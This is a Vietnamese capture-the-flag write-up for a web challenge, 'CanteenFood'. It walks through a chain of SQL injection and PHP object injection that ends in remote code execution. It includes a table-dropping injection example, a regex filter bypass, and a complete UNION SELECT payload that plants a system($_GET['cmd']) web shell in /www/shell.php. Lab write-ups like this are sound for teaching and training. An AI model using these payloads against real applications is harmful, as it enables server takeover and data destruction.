```yaml
---
title: "CanteenFood CTF Challenge"
date: 2025-09-09
categories: [pentesting, Web-Exploitation, CTF]
---

# CanteenFood CTF Challenge WriteUp by @Phatmh
## Tiến hành phân tích chức năng theo kiểu BlackBox

![image](https://hackmd.io/_uploads/SJOQlrxHxx.png)
Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.
![image](https://hackmd.io/_uploads/rJesxBgBxx.png)
Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.
![image](https://hackmd.io/_uploads/Hyhgbrgrle.png)
Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.
![image](https://hackmd.io/_uploads/HJ7E-Hlrxg.png)
Nó trả về cho ta dòng **Only access allowed for canteen admin!!!** có vẻ nơi đây đã bị block lại và chỉ cho phép admin truy cập vào.
![image](https://hackmd.io/_uploads/SkPtWBgHle.png)
Sau một lúc phân tích thì mình thấy đường dẫn này liệu có thể là nơi để mình có thể tấn công bằng cách nào đó không vì parameter **?price=** cho phép người dùng thay đổi và đó là một **Untrusted Data** hoàn toàn có thể tấn công vào.

## Tiến hành phân tích Source Code cho sẵn
**AdminController.php**:
![image](https://hackmd.io/_uploads/SJwYPBlrll.png)
Đây là hàm xử lý quyền truy cập của người dùng, nó sẽ dùng method admin để xử lý trang. Sử dụng If Else để kiểm tra Session người dùng, nó sẽ từ chối truy cập khi **$_SESSION["admin"] === false (strict)** và trả về thông báo rằng **Only access allowed for canteen admin!!!**. Còn nếu người dùng là Admin thì nó sẽ trỏ đến AdminModel để đọc file **/logs.txt** và trả về nội dung. Ở đây không có một Sink nào để ta có thể lợi dụng tấn công vào mà chỉ cung cấp cho ta thông tin về cách trang web control được admin.

**CanteenController.php**:
![image](https://hackmd.io/_uploads/BJ1VI--rxx.png)
CanteenController với chức năng chính là hiển thị thực đơn canteen, tạo canteen Model và xử lý fillter theo giá sản phẩm.
**AdminModel.php**:
![image](https://hackmd.io/_uploads/Syr7-4Wrxx.png)
Nơi đây chứa hàm kiểm tra Session để có thể truy cập vào AdminModel trong trường hợp người truy cập là admin, cùng với đó là các constructor để ghi file vào file logs. Ở đây mình để ý một **magic method** là **__wakeup** là một method được gọi khi object được unserialize. Vậy ta có thể lợi dụng method này để tiến hành kịch bản **PHP Object Injection to RCE** được không? Ta sẽ lưu ý đoạn này và tiến hành đọc code tiếp.
**CanteenModel.php**:
Ở đây là một class chứa 2 functions chính là **getFood()** và **filterFood()** 
![image](https://hackmd.io/_uploads/ryhm7EbBex.png)
![image](https://hackmd.io/_uploads/B1fHmNWSel.png)
Tại đây mình đã tìm được Sink để có thể khai thác được cụ thể ở đây là một chuỗi exploit chain lợi dụng Sqli và PHP Object Injection bằng magic method từ đó RCE 
# Giải thích chi tiết chuỗi exploit CTF

## 📋 Tổng quan kiến trúc ứng dụng

### Các thành phần chính:
```
CanteenController 
├── index() → getFood() hoặc filterFood()
├── AdminController 
│   └── admin() → AdminModel::read_logs()
└── AdminModel + LogFile classes
```

### Luồng dữ liệu:
```
User Request → Controller → Model → Database → Response
```

##  Phân tích từng lỗ hổng

### 1. **SQL Injection (filterFood)**
```php
$sql = "SELECT * FROM food where price < " . $price_param;
```

**Vấn đề:** `$price_param` được nối trực tiếp vào query
- Không có escaping, validation, prepared statement
- Attacker có thể inject SQL commands

**Ví dụ:**
```php
// Request: /?price=1 OR 1=1
$price_param = "1 OR 1=1";
$sql = "SELECT * FROM food where price < 1 OR 1=1";  // Lấy tất cả records

// Request: /?price=1; DROP TABLE food; --
$price_param = "1; DROP TABLE food; --";  
$sql = "SELECT * FROM food where price < 1; DROP TABLE food; --";  // Xóa table
```

### 2. **PHP Object Injection (getFood & filterFood)**
```php
if($obj->oldvalue !== '') {
    $dec_result = base64_decode($obj->oldvalue);
    if (preg_match_all('/O:\d+:"([^"]*)"/', $dec_result, $matches)) {
        return 'Not allowed';
    }
    $uns_result = unserialize($dec_result);  // ← NGUY HIỂM!
    // ...
}
```

**Vấn đề:** Unserialize dữ liệu từ database mà chỉ có filter yếu
- `unserialize()` có thể tạo object bất kỳ
- Filter chỉ check regex pattern `O:\d+:"classname"`
- Có thể bypass filter

**Tại sao nguy hiểm:**
```php
// Khi unserialize, PHP sẽ:
1. Tạo object theo class được chỉ định
2. Set các properties
3. Gọi magic method __wakeup() nếu có
```

### 3. **Arbitrary File Write (__wakeup magic method)**
```php
class AdminModel {
    public function __wakeup() {
        new LogFile($this->filename, $this->logcontent);  // ← Magic method!
    }
}

class LogFile {
    public function __construct($filename, $content) {
        file_put_contents($filename, $content, FILE_APPEND);  // ← Ghi file!
    }
}
```

**Vấn đề:** Magic method `__wakeup()` được gọi tự động khi unserialize
- Tạo LogFile object → ghi file với path và content tùy ý
- Không validate filename/content

##  Chuỗi exploit chi tiết
Vậy đây ta có thể đưa ra suy nghĩ rằng khi bắt đầu khởi tạo Object và khi nó gọi đến unserialize() thì magic method đầu tiên nó đi qua sẽ là __wakeup() và cứ mỗi lần nó sẽ khởi tạo value mới bằng file_put_contents vậy nên ở đây kịch bản sẽ là ta sẽ lợi dụng Sqli để ghi vào chuỗi serialize khi mà hàm unserialize gọi đến __wakeup thì nó sẽ thực hiện và chuỗi shell được file_put_contents đưa vào. Bên cạnh đó tuy unserialize được filter bằng regex nhưng hoàn toàn có thể bypass như đã nói ở trên.
![image](https://hackmd.io/_uploads/rkMKOrMSxe.png)
Tiến hành viết Exploit code ở đây lợi dụng class AdminModel để làm ra một gadget chain khi mà nó unserialize thì nó sẽ gọi đến magic method là __wakeup, nên trong quá trình này mình dùng serialize object rồi mình sẽ đưa nó về Base64.
![image](https://hackmd.io/_uploads/B1nzFSzSee.png)
Ở đây mình sẽ truyền shell thẳng vào /www/shell.php vì nơi chứa index của bài sẽ nằm ở root của docker.
![image](https://hackmd.io/_uploads/r1upFHzSgx.png)
Ở đây kịch bản tấn công của mình sẽ là cố gắng `insert` được đoạn mã base64 rồi sau đó sẽ sửa `price=999999999` để nó gọi tất cả các bảng và unserialize và khi nó giải mã `base64` thì cái `oldValue` sẽ giúp ta tạo ra được file `shell.php` nằm ngay trong `/www/`.
![image](https://hackmd.io/_uploads/SJK3yIMSge.png)
Sau khi cố gắng Insert mình sẽ sửa parameter pricer=99999999 để cho nó gọi full bảng và thực hiện quá trình serialize và unserialize với mong muốn nó sẽ tạo file shell.php trong /www/.
![image](https://hackmd.io/_uploads/r1YmxUGree.png)
![image](https://hackmd.io/_uploads/r1ZUl8Mrlx.png)
Có vẻ như kịch bản Insert của mình đã thất bại vì không có một file nào được tạo ở bên trong docker vậy nên ta sẽ phải suy nghĩ đến kịch bản tấn công, vấn đề ở đây là ngoài Insert liệu có cách nào để ta có thể control được luồng dữ liệu mình thêm vào hay không?
![image](https://hackmd.io/_uploads/B104MIfrle.png)
Ở đây để xem cái kịch bản Insert của mình có ổn không thì mình đã truy cập thẳng vào DB của docker và tiến hành Insert thẳng vào bảng luôn và như ảnh trên thì dữ liệu đã được đưa vào bây giờ mình sẽ dùng `curl "http://localhost:1337/?price=999999999"` để nó gọi hết bảng.
![image](https://hackmd.io/_uploads/rk1yX8GHlx.png)
Ở đây có thể thấy nó đã thực sự work nếu ta Insert thẳng vào bảng bằng DB docker, từ đây ta sẽ suy nghĩ rằng có lẽ đã có đoạn code nào đó ngăn chặn user sử dụng Insert để inject value vào bảng.
Bây giờ ta sẽ tiến hành đi kiểm tra code để xem lý do vì sao ta không sử dụng Insert được.
![image](https://hackmd.io/_uploads/Sk7IQuMHel.png)
Ở đây sau khi đọc thì nó chỉ cho phép mình sử dụng SELECT và UPDATE thay vì Insert. Dựa theo đó mình đã thử UPDATE nhưng nhận ra là web app không có điểm nào để có thể cập nhật dữ liệu từ đó sử dụng UPDATE để thay đổi giá trị thế nên chỉ còn mỗi SELECT. Vậy ở đây làm sao để dùng SELECT để thay đổi và Insert được payload vào bảng, sau khi tìm kiếm thì UNION SELECT có khả thi để có thể Insert được payload vào mà không cần dùng đến Insert.

Bảng đích: food

Các cột: id, name, oldvalue, price

Mục tiêu: Chèn payload PHP Object Injection vào cột oldvalue

Tiến hành chèn câu Sql vào `-1+UNION+SELECT+999%2C+'hacked'%2C+'TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6MTQ6Ii93d3cvc2hlbGwucGhwIjtzOjEwOiJsb2djb250ZW50IjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO30%3D'%2C+1` thì nó sẽ dựa theo câu Database trở thành:
`SELECT id, name, oldvalue, price FROM food WHERE price < -1 UNION SELECT 999, 'hacked', 'TzorMTA6IkFkbWluTW9kZWwiOjI6e3M6ODoiZmlsZW5hbWUiO3M6MTQ6Ii93d3cvc2hlbGwucGhwIjtzOjEwOiJsb2djb250ZW50IjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO30=', 1`.
![image](https://hackmd.io/_uploads/BJYcV_Mrxl.png)
Sau khi inject thành công nó trả về cho ta một trang trắng xóa, đây là một dấu hiệu tốt vì khi nó được đẩy lên thành công mà không có lỗi nó sẽ trắng như này.
![image](https://hackmd.io/_uploads/HybkB_Mrle.png)
Kiểm tra file docker nó có nhảy file shell không và đã thành công tạo ra file shell.php nằm ngay ở /www/ là root của docker container.
![image](https://hackmd.io/_uploads/HypQr_GHxg.png)
Thành công chạy đến /shell.php và tiến hành truyền câu lệnh `ls` để đọc được các File trong đó.
![image](https://hackmd.io/_uploads/B1GDHOzSlg.png)
Đọc được các Logs ở trong logs.txt mà chỉ admin có thể đọc.
Vậy là đã hoàn thành mục tiêu RCE được web này sử dụng Exploit Chain là SQLi+PHP Object Injection to RCE.



